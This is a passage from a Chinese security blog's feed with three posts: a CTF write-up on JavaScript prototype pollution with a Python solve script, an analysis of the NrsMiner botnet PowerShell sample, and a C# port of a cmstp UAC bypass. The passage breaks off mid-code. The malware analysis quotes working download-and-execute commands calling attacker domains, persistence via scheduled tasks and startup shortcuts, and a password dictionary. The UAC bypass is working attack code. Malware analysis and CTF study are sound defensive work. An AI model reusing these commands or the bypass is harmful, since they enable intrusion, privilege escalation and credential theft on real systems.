req.body.attrkey.toString();/let value = req.body.attrval.toString()；-&gt;setFn(req.session.challenger, key, value); #原链污染点/getflag路径:1.req.body.password为undefined或req.body.password等于req.session.challenger对象里的password则返回登录失败2.req.session.challenger.age值大于79返回糟老头子坏滴很3.Admin对象里的key键的值等于req.body.password则返回真的flag</code></pre><p>漏洞点出现在</p><pre><code class="javascript">setFn(req.session.challenger, key, value);</code></pre><p>setFn函数对应<code>require(&#39;set-value&#39;);</code>,位于同目录下的<code>set-value/index.js</code>里的result函数</p><pre><code class="javascript">function result(target, path, value, merge) {  if (merge &amp;&amp; isPlain(target[path]) &amp;&amp; isPlain(value)) {    target[path] = merge({}, target[path], value);  } else {    target[path] = value;  }}</code></pre><p>对应的Github:<a href="https://github.com/freewisdom/set-value" target="_blank" rel="noopener">https://github.com/freewisdom/set-value</a><br><img src="https://s3.ax1x.com/2021/03/10/6JvsEt.png" alt=""></p><p>由于需要以<code>{&quot;key&quot;:&quot;value&quot;}</code>的方式来进行更新，所以要用json，具体是看文章知道</p><p>考点如下</p><pre><code>1.发现路由&quot;/reg&quot;会创建一个challenger用户字典2.发现路由&quot;/update&quot;可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改3.路由&quot;/getflag&quot;可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password是多少我们是不知道的</code></pre><p>题目解题思路如下</p><pre><code>1.操控源链创建一个变量2.更新req.session.challenger对象里age键值</code></pre><p>最后请求/getflag路径的时候，设置key参数为新建变量的名称和设置password变量名为新建变量名的值,使判断成立</p><pre><code class="javascript">if (req.body.password === undefined || req.body.password === req.session.challenger.password){        res.send(&quot;登录失败&quot;);    }else{        if(req.session.challenger.age &gt; 79){            res.send(&quot;糟老头子坏滴很&quot;);        }        let key = req.body.key.toString();        let password = req.body.password.toString();        if(Admin[key] === password){            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);        }else {            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);        }    }</code></pre><p>payload如下</p><pre><code class="python">import requestsclass getflag(object):    def __init__(self,url):        self.requests=requests.session()        self.headers={&quot;Content-Type&quot;: &quot;application/json&quot;}        self.reg=&quot;{}/reg&quot;.format(url)        self.update=&quot;{}/update&quot;.format(url)        self.getflag=&quot;{}/getflag&quot;.format(url)    def getflag_(self):        reg=self.requests.get(self.reg)        print(reg.text)        update=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;__proto__.pwd22&quot;,&quot;attrval&quot;:&quot;pwd&quot;})        print(update.text)        update2=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;age&quot;,&quot;attrval&quot;:10})        print(update2.text)        flag=self.requests.post(self.getflag,headers=self.headers,json={&quot;key&quot;:&quot;pwd22&quot;,&quot;password&quot;:&quot;pwd&quot;})        print(flag.text)if __name__ == &#39;__main__&#39;:    obj=getflag(&quot;http://114.67.246.176:19392&quot;)    obj.getflag_()</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6Jv28S.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_41107295/article/details/95789944" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/95789944</a><br><a href="https://www.cnblogs.com/escape-w/p/12347705.html" target="_blank" rel="noopener">https://www.cnblogs.com/escape-w/p/12347705.html</a><br><a href="https://www.wlhhlc.top/posts/49040/" target="_blank" rel="noopener">https://www.wlhhlc.top/posts/49040/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目考的目的:js原链污染&lt;/p&gt;
&lt;h2 id=&quot;js原链污染简介&quot;&gt;&lt;a href=&quot;#js原链污染简介&quot; class=&quot;headerlink&quot; title=&quot;js原链污染简介&quot;&gt;&lt;/a&gt;js原链污染简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;JavaScript是一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NrsMiner挖矿僵尸网络分析</title>
    <link href="http://422926799.github.io/posts/855d1ef5.html"/>
    <id>http://422926799.github.io/posts/855d1ef5.html</id>
    <published>2021-03-06T14:51:28.000Z</published>
    <updated>2021-03-06T15:54:08.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下午在群里看见一<code>app.any.run</code>的链接，没啥事情做分析了一下。做个记录</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>样本名称:shady.ps1<br>sha256:1a3960eaf2021049e1eaed4c76029420a62c881f65533b3741be2050328a2ac4<br>sha1:6b294f6ad208cb7d23172cafbccf3db3d78b2c62<br>md5:5474aa765ddd0c1dff33e5bbe4aba272    </p><p><code>shady.ps1</code>打开一看 ，混淆过的<br><img src="https://s3.ax1x.com/2021/03/06/6uhpx1.png" alt=""></p><p>定位到函数结尾，发现IEX<br><img src="https://s3.ax1x.com/2021/03/06/6u4YTO.png" alt=""></p><p>写到新的ps1，整体如下<br><img src="https://s3.ax1x.com/2021/03/06/6u4snP.png" alt=""></p><p>函数列表</p><pre><code>function make_smb1_anonymous_login_packet function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_smb1_login8_packet8 function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function localscan function geth function LoadApifunction sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-BootKeyfunction Get-HBootKeyfunction Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function Get-UserKeysfunction DumpHashesfunction Invoke-MypassFunction LGDJSRFunction Get-WiSDGKDantsFunction Get-l64ftionFunction bud-ksgLHDnwnFunction Add-SignedIntAsUnsignedFunction Compare-Val1GreaterThanVal2AsUIntFunction Convert-UIntToIntFunction Test-MemoryRangeValidFunction Write-BytesToMemoryFunction Get-DelegateTypeFunction klsdjlkhfDjswpdyFunction Enable-SeDebugPrivilegeFunction sadkjhdsjDFunction Get-ImageNtHeadersFunction DHWE-kidDFunction KDHSD-JUWFFunction HDSK-OUHFFunction KJSHDeUFHEF7Function Cthis-SectioDSnsFunction LSHDjh3-updFunction lhsdu-jsdFunction SDhk34JSDFunction usdKdhdfFunction KSHDUWKHFFunction SDHlhuhWEDSDDSFunction GessKUDBSDFunction LHSDGUKsdHFFunction SDLHLESDMEFunction MainFunction Mainfunction Invoke-SEfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMBTreeConnectAndXRequestfunction New-PacketSMBNTCreateAndXRequestfunction New-PacketSMBReadAndXRequestfunction New-PacketSMBWriteAndXRequestfunction New-PacketSMBCloseRequestfunction New-PacketSMBTreeDisconnectRequestfunction New-PacketSMBLogoffAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestFilefunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction New-PacketRPCBindfunction New-PacketRPCRequestfunction New-PacketSCMOpenSCManagerWfunction New-PacketSCMCreateServiceWfunction New-PacketSCMStartServiceWfunction New-PacketSCMDeleteServiceWfunction New-PacketSCMCloseServiceHandlefunction Get-StatusPendingfunction Get-UInt16DataLengthfunction Invoke-SMBCfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestfunction New-PacketSMB2FindRequestFilefunction New-PacketSMB2QueryInfoRequestfunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketSMB2IoctlRequest()function New-PacketSMB2SetInfoRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction Get-UInt16DataLengthfunction copyrun function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function New-PacketSMB2IoctlRequest()</code></pre><p><strong>执行过程</strong></p><pre><code>-5获取所有用户名添加到用户列表    匹配普通用户SID的正则:        添加到$alluser列表-4检查当前用户是不是管理员    获取本机hash:        用户标志位(变量名:$un)        用户hash(变量名:$hs)        匹配出是管理员的hash            添加到用户列表(变量名:alluser)            添加到hash列表(变量名:$allhash)-3获取明文密码和NTLM HASH    匹配出用户名(变量名:$mm)    匹配出明文密码(变量名:$pp)    匹配出NTLM HASH(变量名:$nn)    匹配出域名(变量名:$dd)    用户名不为空:        添加到$getusers列表        添加到$alluser列表    明文密码不为空:        添加到$getpasswd列表        添加到$allpass列表    函数不为空(31d6cfe0d16ae931b73c59d7e0c089c0为空hash):        添加到$gethashs列表        添加到$allhash列表    域名不为空、不为workgroup组、不为本地计算机名:        添加到$getdomain组</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIpxs.png" alt=""></p><p>之后循环执行以下内容</p><pre><code>while(true)循环执行:    1.线程休眠200秒    2.创建名为Global\PSexec的互斥锁    3.获取第一张网卡的MAC地址    4.获取杀毒软件    5.如果存在杀毒 (条件判断)        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|        False:$av变量为空    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容    8.调用localscan函数检查本地和内网445端口判断是否开启    9.调用localscan函数检查本地和内网65353端口判断是否开启    10.$Bserver数组不存在该IP调用copyrun函数        调用Invoke-SMBC函数hash传递攻击        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)                    netsh.exe firewall add portopening tcp 65353 DNS&amp;netsh interface portproxy add v4tov4 listenport=65353 connectaddress=1.1.1.1 connectport=53                    schtasks /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn Sync /tr &quot;powershell -nop -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AHMAbQBiACcAKQA=&quot; /F #解码base64:IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/p?smb&#39;)                    schtasks /run /tn Sync&#39;                    上传文件到:                        C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:                        C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try{(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True){try{IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/low?ipc&#39;)}catch{Sleep -m 2500000}}&quot;,0,false);}catch(e){}                        C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;        传递失败:    11.MS17010扫描攻击    12.休眠100秒</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIMs1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/03/06/6uIWyn.png" alt=""></p><p>提取出来的快捷方式<br><img src="https://s3.ax1x.com/2021/03/06/6uoZ0P.png" alt=""></p><p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表:</p><pre><code>administratoradmin</code></pre><p>hash表</p><pre><code>32ed87bdb5fdc5e9cba88547376818d48846f7eaee8fb117ad06bdd830b7586c259745cb123a52aa2e693aaacca2db522d20d252a479f485cdf5e171d93985bfc22b315c040ae6e0efee3518d830362b7a21990fcd3d759941e45c490f143d5f7ce21f17c0aee7fb9ceba532d0546ad62d7f1a5a61d3a96fb5159b5eef17adc6328727b81ca05805a68ef26acb252039f7eb9c06fafaa23c4bcf22ba6781c1e2579110c49145015c47ecd267657d3174320a78179516c385e35a93ffa0b1c4acf9e37e83b83c47a93c2f09f66408631b31fc0dc8f7dfad0e8bd7ccc3842f2ce9f2477a144dff4f216ab81f2ac3e3207dbecedb42ec3c5c7f965255338be4453cccd3d95ea08b81140eee3cfbb98c68f18d4ef8654a9adc66d4f628e94f66e31b6d3986e540a63647454a50e26477ef94e8cd0e4a9e89eab931dc5338fcbec54a0d757ad173d2fc249ce19364fd64c8ecaf27efb60c7b238910efe2a7e0676a3974ed32086b1317b742c3a92148df10198af326aa4850225b75c592d4ce19ccf5bb53a477af18526ada697ce2e51f76b34057b60b514c5402dde3d29a1845c36627cd214350e6172ce708ee05f9d6d70a72f5cfa80f07819ccbcfb72feb9eb9b7f67f5e3f66efd7298be6acd32eeeb27c1d7774d5bbec877ba1bbfcac2f1ae2961c4ecc8938fb93812779077127e976626920c58d0df184d829189c44fafb7ece3fa45a060bd2693ae4c05b601d05ca0c152efbcfafeb22eabda8fc5e68697a41ad70819c5bc807280974d80f45982011c4e9cf8a64cfa6893e2fb666cd566d48f40460fe1ceec6f6785997f3319553bb1b46daf193bb579bdb3b8c6f09637eccee9423d5425f22baf082877edf0a5223820b13c5212be1f85048d7cc8f70bfa508381a7cb6f73d13260089df6015b7b469cbe3acbc48a3a289e8cdb000c2b7a820b2a7351c899fd8e230caad9dd9b994bcd285980e1d9b302e16875844ef697759dea36d05aacaa547de42e9956678e7162e829be112225fedf856e38e1c65fe9f8cc8c6e9e8ba3344ce00078175a4fff9e37e83b83c47a93c2f09f66408631bfaf94587adbfb93df82380f7ca2be801711417f28b0f8d2c5c1cde9554cf8f88acf586e39c5838baeea66ec864d7c437114a90eadeb78697e8f5d14888324caf3837b6534834cc2a88c58bf90b2d96f448d28627b7f196284b73f3c6fae4eded8a72db9f0eea602e3770c45cd3ed9bcdbdc2ef9d128643a227639d2f142d1434ba48d0d7833d929ba60030ae19a63875b20b89488f6f2decabf80294727a04306e2ba7aaa0297ecba56e3d90393bc147324e773ec800dc70882568f5a41d2b6362b26c13b70e7d5a9724710a41e63688f5c864e939801f4f239ff455c33730f821da95b451c2736231eedb87d08f7edbcd73b0aeeb2d1c1907c8783a05e8dd08c0d1ba5fcad640041f86f8060b384915b6d9897df4bb61b416fa405159418033aaf9f89a2d4d0cef5f8912461132b30ffac5d668099409cb6fa223a32ea493b62386e5c805ab8dff955fdb893df85f47f96ab5f0c4b478ee16d9520e4eb4318417dc1cd2340de61ee329d2bb291acb56ed356698adc4fcffe90c3e6d250fcf167b592e4f8178b4c75788531b2e74768747bf8039a8506cd67c524a03ff84ba4e5ae7b89b3afea28d448ed31b5c70428973f5d97549f033374fa6d9f9ce247ffde5ae562ddfaa6b446c32764ab1ebf3ed161cff084477fe596a5db81874498a24a87f3a337d73085c45f9416be5787d8600affd88fa323b00d4560bf9fef0ec2f69943c5e63b4d2c104dbbcc15138b72b588feb889288fb953b5f094d47d1565c3dbde697d71690a769204beb12283678df54de3f3438343202c1dd523d0265bef1351ac828428d74f6da2968089fc91fb3ec3e03e2a202cbd54fd104b8504fefa80c9cc3f8439ada25af064a874efe2d13b29964cc2480b4ef454c59562e675cde26cce0356891a4a020e7c4957afc72e19ccf75ee54e06b06a5907af13cef4230fcaa8ad9a496b3e17f7fbfacc7299341630abb825ca50da31ce1fac1e9f54df56a8399599f1be040128b1dd9623c292e4dbf83aa056289935daea328977b20b9f917853e3dbf6e6831ecce607259305835048ce94ad0564e29a924a03510efa4141712f19e9dd5adf16919bb38a95c</code></pre><p>明文密码</p><pre><code>123456password12345678qwerty1234567891234512341111111234567dragon123123baseballabc123footballmonkeyletmein696969shadowmaster666666qwertyuiop123321mustang1234567890michael654321pussysuperman1qaz2wsx7777777fuckyou121212000000qazwsx123qwekillera123456a123456789woaini1314qq123456abc123456123456a123456789a147258369zxcvbnm98765432112345678910abc123qq123456789123456789.7708801314520woaini5201314520q123456123456abc1233211234567123123123123456.0123456789asd123456aa123456135792468q123456789abcd12345612345678900woaini520woaini123zxcvbnm1231111111111111111w123456aini1314abc123456789PASSWORDAa123456qwer12345123@abc123!@#qwe1qaz@WSXPassw0rd123qwe!@#112123321888888abcd1234p@sswordP@sswordp@ssw0rdP@ssw0rdP@SSWORDP@SSW0RDP@$$w0rdP@$$wordpassw0rdpassword1administrator</code></pre><p>其中计划任务里的url，下载的另外个ps1。其实就是一开始混淆过的ps1，用于权限维持(下载的update.png)<br>1.获取首个网卡MAC地址<br>2.互斥锁创建<br>3.检查C:\Windows\Temp\xxx.log是否存在，不存在则创建Winnet计划任务<br>4.休眠随机1-20秒<br>5.检查进程运行的命令是否带有downloadstring,没有远程下载执行</p><pre><code class="powershell">[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC) #首个网卡MAC地址try{        $name = &#39;Global\PSEXEC&#39;        $exeflag = $flase        New-Object System.Threading.Mutex ($true,$name,[ref]$exeflag) #互斥锁创建}catch{}$dt = Get-Date -Format &#39;yyMMdd&#39; #日期格式化$path = &quot;$env:temp\\ccc.log&quot;[string]$flag = test-path $path #检查路径是否存在$permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;) #判断当前用户是否位管理员$key = &quot;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;version=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + &quot;&amp;flag2=&quot; + $flag + &quot;&amp;domain=&quot; + (Get-WmiObject win32_computersystem).Domain + &quot;&amp;user=&quot; + $env:USERNAME + &quot;&amp;PS=&quot; + $exeflagif($flag -eq &#39;False&#39;){        New-Item $path -type file        if($permit){                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?hig&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /ru system /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39; #创建计划任务                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }else{                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?low&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39;                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }        &amp;schtasks /run /tn &quot;Winnet&quot; #创建另外个计划任务}else{}sleep (get-random -inputobject (1..20)) #休眠1-20秒try{        $run = Get-WmiObject Win32_Process | select commandline | Select-String -Pattern &quot;downloadstring&quot; #检查进程运行的命令是否带有downloadstring,没有远程下载执行        if(($run.length -lt 0) -and $exeflag){            $onps = &quot;/c powershell -nop -w hidden -ep bypass -c &quot; + &#39;&quot;&#39; + &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;&quot; + &quot;http://188.166.162.201/update.png?&amp;&quot; + $key + &quot;&#39;)&quot; + &#39;&quot;&#39;            Start-Process -FilePath cmd.exe -ArgumentList &quot;$onps&quot;        }else{}}catch{}kill $pid</code></pre><p>IP:188.166.162.201<br>脚本内的某些函数来源于:<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br>原ps1下载地址:<a href="http://188.166.162.201/update.png?mac=&amp;av=" target="_blank" rel="noopener">http://188.166.162.201/update.png?mac=&amp;av=</a>&lt;av_name&gt;&amp;version=&lt;os_version&gt;&amp;bit=&lt;os_arch&gt;&amp;flag2=&amp;domain=<groupname>&amp;user=<username>&amp;PS=False<br>后续下载地址:<a href="http://pslog.estonine.com/logging.php" target="_blank" rel="noopener">http://pslog.estonine.com/logging.php</a> <a href="http://p.estonine.com/p?smb" target="_blank" rel="noopener">http://p.estonine.com/p?smb</a> <a href="http://p.estonine.com/low?ipc" target="_blank" rel="noopener">http://p.estonine.com/low?ipc</a><br>微步查询:<br><a href="https://x.threatbook.cn/nodev4/domain/p.estonine.com" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/domain/p.estonine.com</a><br><a href="https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880" target="_blank" rel="noopener">https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880</a></username></groupname></p><p>update.png MD5:e279958da1c4dc11eb3a77909fce551e</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>能力有限，有没分析出来的见谅</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;下午在群里看见一&lt;code&gt;app.any.run&lt;/code&gt;的链接，没啥事情做分析了一下。做个记录&lt;/p&gt;
&lt;h2 id=&quot;分析过程&quot;&gt;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>cmstp bypassuac研究</title>
    <link href="http://422926799.github.io/posts/d38c8377.html"/>
    <id>http://422926799.github.io/posts/d38c8377.html</id>
    <published>2021-03-04T12:58:58.000Z</published>
    <updated>2021-03-04T13:06:39.281Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.anquanke.com/post/id/86685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86685</a><br><a href="https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g</a></p><p>对应的powershell脚本:</p><p><a href="https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1" target="_blank" rel="noopener">https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1</a></p><p>测试系统：</p><pre><code>* windows 10* windows 7* windows server 2012* windows server 2008</code></pre><p>C#改造</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Diagnostics;using System.Runtime.InteropServices;using System.Windows.Forms;using System.IO;using System.Threading.Tasks;namespace cmstp_bypassuac{    class Program    {        [DllImport(&quot;user32.dll&quot;, SetLastError = true)]        public static extern bool SetForegroundWindow(IntPtr hWnd);        public static string createinf() {            string filename = &quot;test.inf&quot;;            string command = @&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;;            string data = @&quot;[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]CustomDestination=CustInstDestSectionAllUsersRunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection]; Commands Here will be run Before Setup Begins to install{0}taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers]49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection]&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;,  &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot; % UnexpectedError % &quot;&quot;, &quot;&quot;&quot;&quot;    [Strings]ServiceName = &quot;&quot;CorpVPN&quot;&quot;ShortSvcName = &quot;&quot;CorpVPN&quot;;            data = string.Format(data, command);            File.WriteAllText(filename, data);            if (File.Exists(filename))            {                Console.WriteLine(&quot;Create Inf File is ok&quot;);                var currentpath = System.IO.Directory.GetCurrentDirectory() +  &quot;\\&quot;+filename;                return currentpath;            }            else {                Console.WriteLine(&quot;Create Inf File Failure...&quot;);                return &quot;&quot;;            }        }        public static IntPtr execute() {            Process[] cmstpdata = Process.GetProcessesByName(&quot;cmstp&quot;); //获取CMSTP线程            if (cmstpdata.Length != 0)            {                cmstpdata[0].Refresh();                var windowhandle = cmstpdata[0].MainWindowHandle;                return windowhandle;            }            else            {                Console.WriteLine(&quot;Not Found cmstp handle,exit....&quot;);                return IntPtr.Zero;            }        }        static void Main(string[] args)        {            string infpath=createinf();            if (infpath.Length != 0)            {                ProcessStartInfo runcmd =new  ProcessStartInfo(&quot;C:\\Windows\\System32\\cmstp.exe&quot;);                runcmd.Arguments = &quot;/au \&quot;&quot;+infpath+&quot;\&quot;&quot;;                